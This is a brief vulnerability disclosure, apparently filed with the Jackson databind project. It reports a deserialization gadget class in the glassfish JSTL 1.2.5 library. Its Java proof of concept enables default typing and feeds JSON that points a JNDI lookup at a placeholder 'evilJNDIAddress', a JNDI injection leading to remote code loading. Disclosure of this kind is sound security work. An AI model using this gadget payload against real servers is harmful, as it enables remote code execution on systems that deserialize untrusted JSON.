Report by: bu5yer (of Sangfor FarSight Security Lab)
Received: 2020-12-22
Evaluation:

  Library

    https://mvnrepository.com/artifact/org.glassfish.web/javax.servlet.jsp.jstl

  is notable enough (68 deps) to qualify

---------------------------------------------------------------------------

Vulnerability description

   com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool

---------------------------------------------------------------------------

Vulnerability proof:

[pom.xml]

<dependencies>
    <dependency>
        <groupId>org.glassfish.web</groupId>
        <artifactId>javax.servlet.jsp.jstl</artifactId>
        <version>1.2.5</version>
    </dependency>
</dependencies>

public class Poc {
    public static void main(String args[]) {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();

   String json = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",
        {\"jndiPath\":\"evilJNDIAddress\"}]";
   try {
	 Object poc = mapper.readValue(json, Object.class);
      mapper.writeValueAsString(poc);
    } catch (IOException e) {
         e.printStackTrace();
    }
}


